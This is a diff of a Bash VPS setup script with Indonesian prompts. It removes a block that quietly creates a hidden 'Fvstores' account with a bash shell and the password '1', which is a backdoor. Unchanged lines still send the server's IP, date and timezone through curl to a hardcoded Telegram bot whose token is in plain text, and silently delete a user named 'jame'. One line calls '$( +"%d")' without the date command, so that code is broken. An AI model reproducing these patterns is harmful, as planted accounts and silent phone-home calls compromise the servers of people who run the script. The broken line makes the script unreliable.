@@ -256,12 +256,7 @@ read -rp " Pilih Opsi Dari ( 1 - 2 ) : " dns
     fi
 
     mkdir -p /home/script/
-    Username="Fvstores"
-    Password=1
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     userdel jame > /dev/null 2>&1
-    
     tgl2=$( +"%d")
     bln2=$(date +"%b")
     thn2=$(date +"%Y")
@@ -279,7 +274,7 @@ read -rp " Pilih Opsi Dari ( 1 - 2 ) : " dns
     <code>Date & Time = </code><code>$tnggl & $TIMEZONE</code>
     <code>IP vps      = </code><code>$MYIP</code>
     <code>────────────────────</code>
-    "'&reply_markup={"inline_keyboard":[[{"text":" ᴏʀᴅᴇʀ🧊 ","url":"https://t.me/fv_stores"},{"text":" ᴏʀᴅᴇʀ🧊 ","url":"wa.me/083160098834"}]]}'
+    "'&reply_markup={"inline_keyboard":[[{"text":" ᴏʀᴅᴇʀ🧊 ","url":"https://t.me/fv_stores"},{"text":" ᴏʀᴅᴇʀ🧊 ","url":"wa.me/083160098834"}]]}'"
 curl -s --max-time 1 -d "chat_id=-1001899398362&disable_web_page_preview=1&text=${TEXT}&parse_mode=html" https://api.telegram.org/bot6293396608:AAGqZVrmdQjPc3tOj_gnUoWOVMrBsm8v6Xo/sendMessage
 clear 
 #install ssh & ws python
